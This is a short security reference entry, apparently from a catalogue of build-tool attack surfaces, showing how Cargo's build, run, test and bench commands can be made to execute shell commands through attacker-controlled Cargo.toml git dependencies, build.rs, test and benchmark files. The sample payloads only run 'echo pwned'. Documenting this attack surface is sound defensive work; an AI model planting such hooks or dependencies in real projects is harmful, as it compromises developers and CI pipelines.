---
title: Cargo
tags:
  - cli
  - eval-sh
  - config-file
references: 
- https://doc.rust-lang.org/cargo/commands/cargo-build.html
files: [.cargo/cargo.toml,Cargo.toml,build.rs]
---

`cargo` is the official tool used to compile and run rust projects.

## Build config

Adding dependencies in `Cargo.toml`, it is possible to gain RCE via the methods defined in their respective section.
  - `cargo build`: `dependencies`, `build-dependencies`
  - `cargo run`: `dependencies`
  - `cargo test`: `dependencies`, `dev-dependencies`

```toml
[dependencies]
rust-config-pwn = { git = "https://github.com/boost-rnd/lotp-sandbox-rust-dep.git" }

[build-dependencies]
rust-config-pwn = { git = "https://github.com/boost-rnd/lotp-sandbox-rust-dep.git" }

[dev-dependencies]
rust-config-pwn = { git = "https://github.com/boost-rnd/lotp-sandbox-rust-dep.git" }
```

## Build scripts

`cargo build` will execute `build.rs` in the root directory before building the project. The name is defined in `Cargo.toml` as `package.build`.
Here is `build.rs` to RCE:

```rust
fn main() {
    let _ = std::process::Command::new("sh").arg("-c").arg("echo pwned").output().expect("failed to execute process");
}
```

*Note: The build process doesn't have access to the environnement variable from the bash session.


## Run

`cargo run` execute the code under `src/main.rs` which allows RCE:

```rust
fn main() {
    let _ = std::process::Command::new("sh").arg("-c").arg("echo pwned").output().expect("failed to execute process");
}
```

## Test

`cargo test` executes every file under `tests/` as crates. This allows for RCE via `tests/pwn.rs`:

```rust
#[test]
fn pwn() {
    let _ = std::process::Command::new("sh").arg("-c").arg("echo pwned").output().expect("failed to execute process");
}
```

## Benchmarks

`cargo bench` executes every file under `benches/` as crates. This allows for RCE via `benches/pwn.rs`:

```rust
#![feature(test)]
extern crate test;
#[cfg(test)]
mod tests {
    #[bench]
    fn pwn(_b: &mut test::Bencher) {
        let _ = std::process::Command::new("sh").arg("-c").arg("echo pwned").output().expect("failed to execute process");
    }
}
```

